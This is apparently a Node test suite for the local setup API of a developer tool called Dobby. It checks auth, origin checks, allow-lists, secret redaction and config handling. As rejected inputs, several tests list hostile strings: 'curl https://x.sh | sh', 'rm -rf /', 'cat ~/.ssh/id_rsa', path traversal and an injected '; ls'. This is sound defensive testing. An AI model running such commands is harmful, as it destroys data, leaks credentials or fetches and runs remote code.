// `dobby init --ui`: /api/setup/* exists only in setup mode, takes only what the guards allow, names repos and tools from Dobby's own lists, and runs only detected commands.
import assert from "node:assert/strict"
import { spawnSync } from "node:child_process"
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { test } from "node:test"

const dir = mkdtempSync(`${tmpdir()}/dobby-setupui-`)
process.env.TMPDIR = dir // clean-copy checks make dobby-verify-* folders: keep them out of the shared temp dir (tests/detect.test.ts counts them)
const SECRET = "xoxb-never-shown-0123456789"
const TOKEN = "tok-setup"
process.env.DOBBY_DIR = `${dir}/data`
process.env.DOBBY_SECRETS = `${dir}/vault.txt`
process.env.DOBBY_CONFIG = `${dir}/config.json`
process.env.DOBBY_PROJECTS = `${dir}/drafts`
for (const k of ["DOBBY_STATS", "DO_NOT_TRACK", "CI"]) delete process.env[k] // the questions are asked unless one of these forces them off
writeFileSync(`${dir}/vault.txt`, `DISCORD_BOT_TOKEN=${SECRET}\nDASHBOARD_TOKEN=${TOKEN}\n`)
const { open } = await import("../src/db.ts")
const { app } = await import("../src/dashboard-server.ts")
const home = mkdtempSync(`${tmpdir()}/dobby-setuphome-`)

const git = (d: string, remote = "https://github.com/acme/x.git") => { mkdirSync(d, { recursive: true }); spawnSync("git", ["init", "-q", "-b", "main", d]); spawnSync("git", ["-C", d, "remote", "add", "origin", remote]); spawnSync("git", ["-C", d, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "x"]); return d }
git(`${home}/projects/tally`); git(`${home}/projects/shopfront`); git(`${home}/code/notes`)
writeFileSync(`${home}/projects/tally/Makefile`, "test:\n\t@echo ok\n")
writeFileSync(`${home}/projects/shopfront/Makefile`, "test:\n\t@echo ok\n")

const GOOD = [{ name: "Node", ok: true, detail: "24.0.0", required: true }, { name: "GitHub sign-in", ok: true, detail: "signed in as acme", required: true }]
let n = 0
function make(extra: Record<string, unknown> = {}) {
  const ran: string[] = [], cmds: string[] = [], finished: string[] = [], ghCalls: string[] = []
  const db = open(":memory:")
  const setup = {
    db, root: dir + "/", roots: [`${home}/projects`], home, platform: "linux" as const, fresh: true, configFile: `${dir}/c${n++}.json`,
    check: async () => GOOD as never,
    rights: async () => [],
    machine: "machine-aaaaaa", gh: (a: string[]) => (ghCalls.push(a.join(" ")), { ok: false, out: "" }), onPath: () => true,
    verify: { has: () => true, lfs: () => false },
    run: async (cmd: string) => (ran.push(cmd), { ok: !cmd.includes("FAIL"), out: "all good\n3 passed" }),
    tools: { found: () => false, have: () => true, run: (c: string) => (cmds.push(c), { ok: true, out: "ok" }) },
    jobs: () => [{ name: "dashboard", ok: true, detail: "x" }],
    issues: () => JSON.stringify([{ number: 7, title: "Export to CSV", body: "Done when: the report has an Export button and the file opens in Excel.", labels: [] }]),
    onFinish: () => finished.push("finish"),
    ...extra,
  }
  const h = app(db, { host: "127.0.0.1", token: TOKEN, setup, dist: `${dir}/nodist`, pollMs: 50 })
  const get = (p: string, auth = true) => h.request(`http://127.0.0.1${p}`, { headers: { host: "127.0.0.1", ...(auth ? { cookie: `foreman_dash=${TOKEN}` } : {}) } })
  const post = (p: string, body: unknown, o: { origin?: string | null; type?: string; auth?: boolean } = {}) => h.request(`http://127.0.0.1${p}`, {
    method: "POST", body: typeof body === "string" ? body : JSON.stringify(body),
    headers: { host: "127.0.0.1", ...(o.auth === false ? {} : { cookie: `foreman_dash=${TOKEN}` }), ...(o.origin === null ? {} : { origin: o.origin ?? "http://127.0.0.1" }), "content-type": o.type ?? "application/json" },
  })
  const state = async () => (await (await get("/api/setup/state")).json()) as any
  const until = async (f: (s: any) => boolean) => { for (let i = 0; i < 100 && !f(await state()); i++) await new Promise((r) => setTimeout(r, 20)); return state() }
  return { h, db, get, post, ran, cmds, ghCalls, finished, setup, state, until }
}
const json = async (r: Response) => (await r.json()) as Record<string, any>

test("outside setup mode every /api/setup path is 404, GET and POST", async () => {
  const db = open(":memory:")
  const h = app(db, { host: "127.0.0.1", token: TOKEN, dist: `${dir}/nodist` })
  const c = { host: "127.0.0.1", cookie: `foreman_dash=${TOKEN}`, origin: "http://127.0.0.1", "content-type": "application/json" }
  assert.equal((await h.request("http://127.0.0.1/api/setup/state", { headers: c })).status, 404)
  assert.equal((await h.request("http://127.0.0.1/api/setup/check", { method: "POST", headers: c, body: "{}" })).status, 404)
  assert.deepEqual(await json(await h.request("http://127.0.0.1/api/session", { headers: c })), { canAct: true })
})

test("setup mode: token, same origin, JSON and a small body are all required", async () => {
  const t = make()
  assert.equal((await t.get("/api/setup/state", false)).status, 401)
  assert.equal((await t.post("/api/setup/check", {}, { auth: false })).status, 401)
  assert.equal((await t.post("/api/setup/check", {}, { origin: "http://evil.example" })).status, 403)
  assert.equal((await t.post("/api/setup/check", {}, { origin: null })).status, 403)
  assert.equal((await t.post("/api/setup/check", "{}", { type: "text/plain" })).status, 415)
  assert.equal((await t.post("/api/setup/check", "not json")).status, 400)
  assert.equal((await t.post("/api/setup/check", "[]")).status, 400)
  assert.equal((await t.post("/api/setup/check", JSON.stringify({ x: "a".repeat(20_000) }))).status, 413)
  assert.equal((await t.post("/api/setup/nothing", {})).status, 404)
  assert.equal((await json(await t.get("/api/session"))).setup, true)
  assert.equal((await t.post("/api/setup/check", {})).status, 200)
})

test("a repo not from the list, a tool not in the list, bad folders and bad settings are refused; nothing runs", async () => {
  const t = make()
  await t.post("/api/setup/check", {})
  const bad = async (p: string, b: unknown, code = 400) => { const r = await t.post(`/api/setup/${p}`, b); assert.equal(r.status, code, `${p} ${JSON.stringify(b)}`) }
  await bad("repos/verify", { names: ["../etc"] }); await bad("repos/verify", { names: ["tally", "/bin/sh"] }); await bad("repos/verify", { names: [] }); await bad("repos/verify", {})
  await bad("tools/install", { name: "caveman" }); await bad("tools/install", { name: "rm -rf /" }); await bad("tools/install", { name: "graphify; ls" }); await bad("tools/install", {})
  await bad("repos/roots", { roots: ["/etc"] }); await bad("repos/roots", { roots: [`${home}/projects/tally/Makefile`] }); await bad("repos/add", { path: "/tmp" }); await bad("repos/add", { path: `${home}/code` })
  await bad("settings", { preset: "yolo", auto: "off", deploy: "ask", weekCap: 90 }); await bad("settings", { preset: "balanced", auto: "off", deploy: "ask", weekCap: 5 }); await bad("settings", { preset: "balanced", auto: "off", deploy: "ask", weekCap: "90" })
  await bad("first-ticket", { issue: 999 }); await bad("first-ticket", { title: "x", project: "tally" }); await bad("chat", { chat: "slack" })
  assert.deepEqual([t.ran, t.cmds], [[], []], "no request reached a command")
})

test("the whole flow: check, verify (commands from detection, progress as setup events), settings 0600, jobs, first ticket, finish", async () => {
  const t = make()
  const stream = await t.h.request("http://127.0.0.1/api/events", { headers: { host: "127.0.0.1", cookie: `foreman_dash=${TOKEN}` } })
  const reader = stream.body!.getReader()
  let seen = ""
  void (async () => { for (;;) { const { done, value } = await reader.read().catch(() => ({ done: true, value: undefined })); if (done) break; seen += new TextDecoder().decode(value) } })()
  assert.equal((await t.state()).checks, null)
  assert.equal((await t.post("/api/setup/settings", { preset: "balanced", auto: "off", deploy: "ask", weekCap: 90 })).status, 409, "check this machine first")
  await t.post("/api/setup/check", {})
  const s0 = await t.state()
  assert.deepEqual(s0.blocking, []); assert.ok(s0.checks.every((c: any) => c.name !== "config"))
  assert.deepEqual(s0.repos.map((r: any) => r.name), ["shopfront", "tally"])
  assert.equal((await t.post("/api/setup/repos/roots", { roots: [`${home}/projects`, `${home}/code`] })).status, 200)
  assert.deepEqual((await t.state()).repos.map((r: any) => r.name), ["shopfront", "tally", "notes"])
  assert.equal((await t.post("/api/setup/repos/add", { path: `${home}/code/notes` })).status, 200)
  assert.equal((await t.post("/api/setup/repos/verify", { names: ["tally", "shopfront"] })).status, 200)
  const s1 = await t.until((s) => s.verify.shopfront?.state === "ok")
  assert.deepEqual(t.ran, ["true", "make test", "true", "make test"], "install then test for each repo, from detection")
  assert.equal(s1.verify.tally.state, "ok"); assert.match(s1.verify.tally.last, /3 passed/)
  assert.ok(existsSync(`${dir}/drafts/tally.md`) && existsSync(`${dir}/drafts/shopfront.md`), "a draft for each repo that passed")
  assert.match(readFileSync(`${dir}/drafts/tally.md`, "utf8"), /^---\nrepo: .*projects\/tally\n/)
  assert.match(seen, /event: setup/, "progress arrives as setup events")
  assert.equal((await t.post("/api/setup/tools/install", { name: "rtk" })).status, 200)
  assert.deepEqual(t.cmds, ["brew install rtk"])
  assert.deepEqual((await t.state()).tools.map((x: any) => [x.name, x.on]), [["graphify", true], ["rtk", true], ["caveman", true], ["ponytail", true], ["jev", false]])
  assert.equal((await t.post("/api/setup/settings", { preset: "strict", auto: "drafts", deploy: "ask", weekCap: 80 })).status, 200)
  const saved = JSON.parse(readFileSync(t.setup.configFile, "utf8"))
  assert.deepEqual([saved.safety, saved.review, saved.pacing, saved.github.owner], [{ preset: "strict", deploy: "ask" }, { auto: "drafts" }, { weekCap: 80 }, "acme"])
  assert.equal(saved.paths.projectRoots.length, 1, "the second folder is kept for the next run")
  assert.equal(statSync(t.setup.configFile).mode & 0o777, 0o600)
  assert.match(JSON.stringify(t.db.prepare("SELECT * FROM kv").all()), /merges/, "a fresh install pauses merges")
  assert.equal((await json(await t.post("/api/setup/jobs", { install: true }))).ok, true)
  await t.post("/api/setup/first-ticket/find", {})
  const cand = (await t.state()).candidates
  assert.equal(cand[0].number, 7); assert.match(cand[0].text, /Done when/)
  assert.equal((await json(await t.post("/api/setup/first-ticket", { issue: 7, project: cand[0].project }))).ok, true)
  assert.equal((t.db.prepare("SELECT COUNT(*) n FROM tickets").get() as { n: number }).n, 1)
  assert.equal(t.finished.length, 0)
  await t.post("/api/setup/finish", {})
  await new Promise((r) => setTimeout(r, 600))
  assert.deepEqual(t.finished, ["finish"])
  await reader.cancel()
})

test("a failing check stays listed with its fix command; a failing repo is left out of the drafts", async () => {
  const bad = [{ name: "git", ok: false, detail: "not installed", required: true, fix: "xcode-select --install" }, ...GOOD]
  const t = make({ check: async () => bad as never, find: () => [{ dir: `${home}/projects/tally`, pm: "make", install: "true", test: "make FAIL", deploy: null, base: "main", remote: "acme/tally" }], run: async (c: string) => ({ ok: !c.includes("FAIL"), out: "2 tests failed" }) })
  await t.post("/api/setup/check", {})
  const s = await t.state()
  assert.deepEqual(s.blocking, ["git"]); assert.equal(s.checks.find((c: any) => c.name === "git").fix, "xcode-select --install")
  await t.post("/api/setup/repos/verify", { names: ["tally"] })
  const v = (await t.until((x) => x.verify.tally?.state === "failed")).verify.tally
  assert.deepEqual([v.state, v.step, v.last], ["failed", "test", "2 tests failed"]); assert.match(v.fix, /make FAIL/)
})

test("secrets: no endpoint accepts or returns a token or key; the Discord token shows as set", async () => {
  const t = make()
  await t.post("/api/setup/check", {})
  const text = await (await t.get("/api/setup/state")).text()
  assert.ok(!text.includes(SECRET) && !text.includes(TOKEN))
  assert.equal(JSON.parse(text).chat.discordToken, true)
  for (const p of ["chat", "settings", "stats", "check"]) { const r = await (await t.post(`/api/setup/${p}`, { token: SECRET, DISCORD_BOT_TOKEN: SECRET })).text(); assert.ok(!r.includes(SECRET), p) }
  assert.ok(!readFileSync(`${dir}/vault.txt`, "utf8").includes("evil"), "the secrets file is never written by setup")
})

test("stats questions: no answer is off", async () => {
  const t = make()
  assert.equal((await t.post("/api/setup/stats", {})).status, 200)
  const c = JSON.parse(readFileSync(t.setup.configFile, "utf8")).stats
  assert.deepEqual([c?.crashes, c?.usage], [false, false])
})

// ---- Ask Claude, failed repos, nothing ready ----
const claudeFake = (text = '{"cause":"No database.","fix":"Use the unit tests.","test":"make unit"}') => { const calls: { model: string; prompt: string; cwd: string }[] = []; return { calls, claude: async (o: { model: string; prompt: string; cwd: string }) => (calls.push(o), { ok: true, text }) } }
const FAILING = { find: () => [{ dir: `${home}/projects/tally`, pm: "make", install: "true", test: "make FAIL", deploy: null, base: "main", remote: "acme/tally" }, { dir: `${home}/projects/shopfront`, pm: "none", install: "true", test: null, deploy: null, base: "main", remote: "acme/shopfront" }], run: async (c: string) => ({ ok: !c.includes("FAIL"), out: `line\nDOBBY_API_KEY=${SECRET}\n2 tests failed` }) }

test("Ask Claude: never without a click; only about a listed repo or a failing check; Haiku first, Sonnet only when asked; output redacted", async () => {
  const f = claudeFake()
  const t = make({ ...FAILING, claude: f.claude })
  await t.post("/api/setup/check", {}); await t.post("/api/setup/repos/verify", { names: ["tally"] }); await t.until((s) => s.verify.tally?.state === "failed")
  assert.equal(f.calls.length, 0, "setting up and failing calls no model")
  const bad = async (b: unknown) => assert.equal((await t.post("/api/setup/help", b)).status, 400, JSON.stringify(b))
  await bad({ kind: "verify-failed", repo: "../etc" }); await bad({ kind: "verify-failed", repo: "ghost" }); await bad({ kind: "verify-failed" }); await bad({ kind: "check", check: "Bash" }); await bad({ kind: "check", check: "Node" }) // Node passes
  await bad({ kind: "chat" }); await bad({ kind: "verify-failed", repo: "tally", model: "opus" }); await bad({ kind: "no-commands", repo: "tally" }) // tally has a test command
  assert.equal(f.calls.length, 0, "refused requests never reach the model")
  const r = await json(await t.post("/api/setup/help", { kind: "verify-failed", repo: "tally" }))
  assert.equal(r.ok, true); assert.equal(r.suggestion.test, "make unit"); assert.deepEqual(f.calls.map((c) => c.model), ["haiku"]); assert.equal(f.calls[0].cwd, `${home}/projects/tally`)
  assert.ok(f.calls[0].prompt.includes("2 tests failed") && !f.calls[0].prompt.includes(SECRET), "output is redacted before it is sent")
  await t.post("/api/setup/help", { kind: "verify-failed", repo: "tally", model: "sonnet" })
  assert.deepEqual(f.calls.map((c) => c.model), ["haiku", "sonnet"])
  const n = await json(await t.post("/api/setup/help", { kind: "no-commands", repo: "shopfront" }))
  assert.equal(n.ok, true); assert.equal(f.calls.length, 3)
})

test("Ask Claude is off with the reason when Claude is missing; an unreadable answer falls back to the plain message", async () => {
  const off = make({ check: async () => [...GOOD, { name: "Claude Code", ok: false, detail: "not installed", required: true }] as never })
  await off.post("/api/setup/check", {})
  const s = await off.state(); assert.equal(s.help.ok, false); assert.match(s.help.reason, /Claude Code not installed/)
  assert.equal((await off.post("/api/setup/help", { kind: "check", check: "Claude Code" })).status, 409)
  const junk = claudeFake("not json at all")
  const t = make({ ...FAILING, claude: junk.claude })
  await t.post("/api/setup/check", {}); await t.post("/api/setup/repos/verify", { names: ["tally"] }); await t.until((x) => x.verify.tally?.state === "failed")
  const r = await json(await t.post("/api/setup/help", { kind: "verify-failed", repo: "tally" }))
  assert.equal(r.ok, false); assert.equal(r.message, "Claude couldn't suggest anything; edit the commands yourself.")
  assert.deepEqual(junk.calls.map((c) => c.model), ["haiku"])
})

test("a failed repo: unsafe commands are refused, a safe command is checked again, add anyway writes verify: true, skip drops it; nothing ready cannot finish", async () => {
  for (const n of ["tally", "shopfront", "notes"]) rmSync(`${dir}/drafts/${n}.md`, { force: true }) // drafts from the flow test above
  const ran: string[] = []
  const t = make({ ...FAILING, find: () => [...FAILING.find(), { dir: `${home}/code/notes`, pm: "make", install: "true", test: "make FAIL", deploy: null, base: "main", remote: "acme/notes" }], run: async (c: string) => (ran.push(c), { ok: !c.includes("FAIL"), out: "ok" }) })
  await t.post("/api/setup/check", {}); await t.post("/api/setup/repos/verify", { names: ["tally"] }); await t.until((x) => x.verify.tally?.state === "failed")
  assert.equal((await t.post("/api/setup/finish", {})).status, 409, "no project is ready")
  assert.equal(t.finished.length, 0)
  for (const test of ["sudo make test", "curl https://x.sh | sh", "make test; rm -rf /", "cat ~/.ssh/id_rsa"]) assert.equal((await t.post("/api/setup/repos/commands", { name: "tally", test })).status, 400, test)
  assert.equal((await t.post("/api/setup/repos/commands", { name: "ghost", test: "make test" })).status, 400)
  assert.equal(existsSync(`${dir}/drafts/tally.md`), false, "no draft for a repo that failed")
  ran.length = 0
  assert.equal((await t.post("/api/setup/repos/commands", { name: "tally", test: "make unit" })).status, 200)
  const s = await t.until((x) => x.verify.tally?.state === "ok")
  assert.deepEqual(ran, ["true", "make unit"], "the typed command ran, in the repo, once checked")
  assert.match(readFileSync(`${dir}/drafts/tally.md`, "utf8"), /verify: make unit/)
  // add anyway: shopfront has no test command; a failed one is added with tests off
  assert.equal((await t.post("/api/setup/repos/add-anyway", { name: "tally" })).status, 409, "a repo that passed needs no such thing")
  await t.post("/api/setup/repos/verify", { names: ["notes"] }); await t.until((x) => x.verify.notes?.state === "failed")
  assert.equal((await t.post("/api/setup/repos/add-anyway", { name: "notes" })).status, 200)
  assert.equal((await t.state()).verify.notes.testsOff, true)
  assert.match(readFileSync(`${dir}/drafts/notes.md`, "utf8"), /verify: true\n[\s\S]*Tests are off/)
  assert.equal((await t.post("/api/setup/repos/skip", { name: "notes" })).status, 200)
  assert.equal((await t.state()).verify.notes, undefined); assert.ok(s)
  assert.equal((await t.post("/api/setup/finish", {})).status, 200)
})

test("a repo this account cannot push to is left out with the fix; merge-rule notes show; a closed merge method is suggested into the settings", async () => {
  const rights = async (remote: string) => remote === "acme/tally"
    ? [{ name: "GitHub access: acme/tally", ok: false, detail: "this account can read the repo but not push", fix: "gh auth switch", required: true }]
    : [{ name: "GitHub access: acme/shopfront", ok: true, detail: "can push", required: true }, { name: "Review rules: acme/shopfront", ok: false, detail: "main needs an approving review: PRs will wait for a second reviewer", required: false }, { name: "Merge method: acme/shopfront", ok: false, detail: "squash merges are turned off", fix: 'set github.mergeMethod to "merge"', required: false, set: { key: "github.mergeMethod", value: "merge" } }]
  const t = make({ ...FAILING, find: () => [FAILING.find()[0], { ...FAILING.find()[1], test: "make ok" }], rights })
  await t.post("/api/setup/check", {}); await t.post("/api/setup/repos/verify", { names: ["tally", "shopfront"] })
  const s = await t.until((x) => x.verify.shopfront?.state === "ok")
  assert.deepEqual([s.verify.tally.state, s.verify.tally.step, s.verify.tally.fix], ["failed", null, "gh auth switch"])
  assert.match(s.verify.shopfront.notes.join("\n"), /Review rules: acme\/shopfront.*second reviewer/)
  await t.post("/api/setup/settings", { preset: "balanced", auto: "off", deploy: "ask", weekCap: 90 })
  assert.equal(JSON.parse(readFileSync(t.setup.configFile, "utf8")).github.mergeMethod, "merge")
})

// ---- gaps with the terminal: DOBBY_OWNER marker, github.owner question, dobby on PATH, terminal-only secrets ----
test("DOBBY_OWNER: set on each repo that passed, never overwritten; another machine's marker comes back as the two-machines warning", async () => {
  const t = make({ find: () => ["tally", "shopfront"].map((n) => ({ dir: `${home}/projects/${n}`, pm: "make", install: "true", test: "make test", deploy: null, base: "main", remote: `acme/${n}` })), gh: (a: string[]) => (t.ghCalls.push(a.join(" ")), a[0] === "variable" && a[1] === "get" ? (a.includes("acme/tally") ? { ok: true, out: "machine-bbbbbb\n" } : { ok: false, out: "" }) : { ok: true, out: "" }) })
  await t.post("/api/setup/check", {})
  await t.post("/api/setup/repos/verify", { names: ["tally", "shopfront"] })
  const s = await t.until((x) => x.verify.tally?.state === "ok" && x.verify.shopfront?.state === "ok")
  assert.ok(t.ghCalls.includes("variable set DOBBY_OWNER --body machine-aaaaaa -R acme/shopfront"), t.ghCalls.join("\n"))
  assert.equal(t.ghCalls.filter((c) => c.startsWith("variable set")).length, 1, "the repo that has another machine's marker is not overwritten")
  assert.equal(s.markerWarnings.length, 1); assert.match(s.markerWarnings[0], /acme\/tally is already worked by machine-bbbbbb; this machine .* is machine-aaaaaa\. Two machines on one repo/)
  const before = t.ghCalls.length
  await t.post("/api/setup/repos/verify", { names: ["tally"] }); await t.until((x) => x.verify.tally?.state === "ok")
  assert.equal(t.ghCalls.length, before, "a repo is marked once per run")
})

test("github.owner: a config from another account asks which to use; keep or use the signed-in login, as the terminal does", async () => {
  for (const choice of ["login", "keep"] as const) {
    const t = make()
    writeFileSync(t.setup.configFile, JSON.stringify({ github: { owner: "someone-else", accounts: ["someone-else"] } }))
    await t.post("/api/setup/check", {}); await t.post("/api/setup/repos/verify", { names: ["tally"] }); await t.until((x) => x.verify.tally?.state === "ok")
    assert.deepEqual((await t.state()).ownerMismatch, { configured: "someone-else", login: "acme" })
    const body = { preset: "balanced", auto: "off", deploy: "ask", weekCap: 90 }
    assert.equal((await t.post("/api/setup/settings", body)).status, 400, "no choice, no save")
    assert.equal((await t.post("/api/setup/settings", { ...body, owner: "maybe" })).status, 400)
    assert.equal((await t.post("/api/setup/settings", { ...body, owner: choice })).status, 200)
    const saved = JSON.parse(readFileSync(t.setup.configFile, "utf8")).github
    assert.equal(saved.owner, choice === "login" ? "acme" : "someone-else")
    if (choice === "login") assert.ok(saved.accounts.includes("acme"))
  }
  const same = make(); writeFileSync(same.setup.configFile, JSON.stringify({ github: { owner: "acme" } }))
  await same.post("/api/setup/check", {}); assert.equal((await same.state()).ownerMismatch, null)
})

test("dobby on PATH and terminal-only secrets: commands to copy, never run, never asked for", async () => {
  const gone = make({ root: "/x/_npx/abc/node_modules/dobby-ai/", onPath: () => false })
  await gone.post("/api/setup/check", {})
  const s = await gone.state()
  assert.equal(s.dobbyCommand.command, "npm i -g dobby-ai"); assert.deepEqual(gone.cmds, [])
  assert.equal((await make().state()).dobbyCommand, null, "on PATH: no row")
  const noKey = make({ check: async () => [...GOOD.filter((r) => r.name !== "Claude sign-in"), { name: "Claude sign-in", ok: false, detail: "not signed in", required: true }] as never })
  await noKey.post("/api/setup/check", {})
  const names = (await noKey.state()).terminal.map((x: { name: string; command: string }) => `${x.name}: ${x.command}`)
  assert.ok(names.includes("Anthropic API key: dobby init"))
  assert.equal((await noKey.post("/api/setup/api-key", { key: SECRET })).status, 404, "no endpoint takes a key")
})

test("a fork: asked once after the check, the default keeps the fork, Original writes upstream: and first-ticket issues come from it; repos left out are listed", async () => {
  const forked = git(`${home}/forks/app`, "https://github.com/me/app.git"); writeFileSync(`${forked}/Makefile`, "test:\n\t@echo ok\n")
  git(`${home}/forks/lab`, "https://gitlab.com/me/lab.git"); git(`${home}/forks/corp`, "https://github.mycorp.com/me/corp.git")
  const asked: string[] = []
  const t = make({ roots: [`${home}/forks`], fork: (r: string) => (asked.push(r), r === "me/app" ? "up/app" : null), detect: undefined, issues: (r: string) => (asked.push(`issues ${r}`), "[]") })
  const s0 = await t.state()
  assert.deepEqual(s0.repos.map((r: any) => r.name), ["app"])
  assert.deepEqual(s0.skipped.map((x: any) => x.text), ["Skipped 1 repo without a GitHub remote: lab", "GitHub Enterprise isn't supported yet. Skipped 1 repo: corp"])
  assert.equal(s0.repos[0].fork, null, "no gh call before the check")
  await t.post("/api/setup/check", {}); await t.post("/api/setup/repos/verify", { names: ["app"] })
  const s1 = await t.until((s) => s.verify.app?.state === "ok")
  assert.deepEqual(s1.repos[0].fork.options.map((o: any) => o.value), ["fork", "upstream"])
  assert.equal(s1.repos[0].fork.use, "fork")
  assert.doesNotMatch(readFileSync(`${dir}/drafts/app.md`, "utf8"), /upstream/, "default: unchanged")
  assert.equal((await t.post("/api/setup/repos/fork", { name: "app", use: "bogus" })).status, 400)
  assert.equal((await t.post("/api/setup/repos/fork", { name: "nope", use: "upstream" })).status, 400)
  assert.equal((await t.post("/api/setup/repos/fork", { name: "app", use: "upstream" })).status, 200)
  assert.match(readFileSync(`${dir}/drafts/app.md`, "utf8"), /\nupstream: up\/app\n/)
  await t.post("/api/setup/first-ticket/find", {})
  assert.ok(asked.includes("issues up/app") && !asked.includes("issues me/app"))
  await t.post("/api/setup/repos/fork", { name: "app", use: "fork" })
  assert.doesNotMatch(readFileSync(`${dir}/drafts/app.md`, "utf8"), /upstream/)
})
